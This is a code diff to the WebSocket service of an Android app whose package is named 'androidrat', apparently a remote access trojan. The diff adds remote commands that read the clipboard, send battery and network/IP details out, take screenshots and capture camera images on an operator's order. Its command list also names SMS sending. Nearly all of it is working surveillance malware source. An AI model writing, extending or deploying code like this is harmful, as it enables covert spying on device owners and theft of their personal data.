@@ -21,7 +21,12 @@ import androidx.core.content.ContextCompat
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
 import com.nqmgaming.androidrat.R
+import com.nqmgaming.androidrat.command.Battery
 import com.nqmgaming.androidrat.command.DeviceInfo
+import com.nqmgaming.androidrat.command.IpAddress
+import com.nqmgaming.androidrat.command.ReadFromClipboard
+import com.nqmgaming.androidrat.command.Screenshot
+import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -32,6 +37,8 @@ import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import okhttp3.Response
 import okio.ByteString
+import okio.ByteString.Companion.toByteString
+import java.io.File
 
 class WebSocketService : Service() {
 
@@ -229,23 +236,50 @@ class WebSocketService : Service() {
                 }
 
                 "read_clipboard" -> {
-                    var result: String? = null
-                    val clipboardManager =
-                        getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager?
-                    if (clipboardManager?.hasPrimaryClip() == true) {
-                        val clip = clipboardManager.primaryClip
-                        if (clip?.description?.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN) == true) {
-                            val item = clip.getItemAt(0)
-                            result = item.text.toString()
+                    // In WebSocketService.kt, inside the onMessage method for the "read_clipboard" command
+                    val clipboardRequestIntent =
+                        Intent("com.nqmgaming.androidrat.CLIPBOARD_REQUEST")
+                    applicationContext.sendBroadcast(clipboardRequestIntent)
+                }
+
+                "battery" -> {
+                    val batteryStatus = Battery.getAllBatteryInfo(applicationContext)
+                    webSocket.send(batteryStatus)
+                }
+
+                "network_info" -> {
+                    val networkInfo = IpAddress.getNetworkInfo(applicationContext)
+                    webSocket.send(networkInfo)
+                }
+
+                "take_screen" -> {
+                    val screenshotIntent =
+                        Intent(this@WebSocketService, ScreenshotService::class.java)
+                    screenshotIntent.action = "START_SCREENSHOT"
+                    screenshotIntent.putExtra("PROJECTION_DATA", mediaProjectionData)
+                    startService(screenshotIntent)
+                }
+
+                "take_picture" -> {
+                    val path = Screenshot.captureImage(this@WebSocketService, false)
+                    try {
+                        val file = File(path)
+                        if (file.exists()) {
+                            webSocket.send("Image captured successfully")
+                        } else {
+                            webSocket.send("Failed to capture image")
                         }
+                    } catch (e: Exception) {
+                        webSocket.send("Failed to capture image")
+
                     }
 
-                    webSocket.send(result ?: "No text found in clipboard")
                 }
 
                 else -> {
                     webSocket.send("Unknown command")
                 }
+
             }
         }
 
@@ -301,6 +335,8 @@ class WebSocketService : Service() {
                 "10. sms - Send SMS\n" +
                 "11. read_clipboard - Read clipboard content\n" +
                 "12. take_picture - Take a picture\n" +
-                "13. take_screen - Take a screenshot\n"
+                "13. take_screen - Take a screenshot (please don't run it require fore background)'\n" +
+                "14. battery - Get battery status\n" +
+                "15. network_info - Get network information\n"
     }
 }
